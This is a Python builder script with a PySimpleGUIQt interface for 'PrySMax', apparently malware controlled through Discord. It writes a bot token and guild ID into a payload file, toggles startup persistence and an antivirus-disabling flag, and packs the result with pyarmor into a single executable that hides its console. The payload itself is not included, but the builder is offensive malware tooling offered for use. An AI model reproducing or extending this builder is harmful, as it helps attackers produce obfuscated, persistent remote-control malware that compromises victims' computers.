import PySimpleGUIQt as sg
import fileinput
import os
import subprocess

if not os.path.exists("builder"):
    os.makedirs("builder")
else:
    os.remove("builder/prysmax.py")

main_content = ""
with open("prysmax.py", 'r', encoding='utf-8') as main_file:
    main_content = main_file.read()

file_path = os.path.join("builder", "prysmax.py")
with open(file_path, 'w', encoding='utf-8') as new_main_file:
    new_main_file.write(main_content)

def main():
    sg.theme('DarkGrey5')

    layout = [
        [sg.Text('PRYSMAX', font=('Courier', 25), justification='center')],
        [sg.Text('BOT-TOKEN:', font=('Courier', 12)), sg.InputText(key='BOT_TOKEN', font=('Courier', 12))],
        [sg.Text('GUILD-ID:', font=('Courier', 12)), sg.InputText(key='GUILD_ID', font=('Courier', 12))],
        [sg.Button('Activate Startup', font=('Courier', 12)), sg.Button('Deactivate Startup', font=('Courier', 12))],
        [sg.Button('Disable AV', font=('Courier', 12)), sg.Button('Download Libraries', font=('Courier', 12)), sg.Button('Compile', font=('Courier', 12))],
        [sg.Button('Exit', font=('Courier', 12))]
    ]

    window = sg.Window('PrySMax Configuration', layout, resizable=True, background_color='black', grab_anywhere=True)

    while True:
        event, values = window.read()

        if event == sg.WINDOW_CLOSED or event == 'Exit':
            break
        elif event == 'Activate Startup':
            activate_startup(values['BOT_TOKEN'], values['GUILD_ID'])
        elif event == 'Deactivate Startup':
            deactivate_startup(values['BOT_TOKEN'], values['GUILD_ID'])
        elif event == 'Disable AV':
            disable_av()
        elif event == 'Download Libraries':
            # Add your code for downloading libraries here
            pass
        elif event == 'Compile':
            subprocess.run('pyarmor pack -e "--onefile --noconsole --icon=NONE" builder\\prysmax.py', shell=True)
            pass

    window.close()

def activate_startup(bot_token, guild_id):
    with fileinput.FileInput("builder/prysmax.py", inplace=True) as file:
        for line in file:
            line = line.replace('startup_for = False', 'startup_for = True')
            line = line.replace('bot_token = "bot-token"', f'bot_token = "{bot_token}"')
            line = line.replace('guild_id = "guild-id"', f'guild_id = "{guild_id}"')
            print(line, end='')

def deactivate_startup(bot_token, guild_id):
    with fileinput.FileInput("builder/prysmax.py", inplace=True) as file:
        for line in file:
            line = line.replace('startup_for = True', 'startup_for = False')
            line = line.replace('bot_token = "bot-token"', f'bot_token = "{bot_token}"')
            line = line.replace('guild_id = "guild-id"', f'guild_id = "{guild_id}"')
            print(line, end='')

def disable_av():
    with fileinput.FileInput("builder/prysmax.py", inplace=True) as file:
        for line in file:
            line = line.replace('Disable_AV = False', 'Disable_AV = True')
            print(line, end='')
if __name__ == '__main__':
    main()
